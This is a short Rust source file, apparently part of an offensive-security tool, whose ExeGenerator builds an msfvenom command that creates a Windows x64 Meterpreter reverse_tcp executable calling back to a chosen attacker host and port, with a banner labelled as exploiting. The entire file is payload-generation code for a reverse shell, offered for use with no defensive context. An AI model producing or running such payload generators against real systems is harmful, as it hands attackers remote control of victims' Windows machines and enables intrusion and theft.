// Windows EXE payload generator
use crate::cli::banner;

pub struct ExeGenerator;

impl ExeGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str, arch: &str, output: &str) -> String {
        banner::print_exploiting("EXE-PAYLOAD", &format!("{}:{} arch:{}", lhost, lport, arch));
        
        format!(
            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe -o {}",
            lhost, lport, output
        )
    }
}
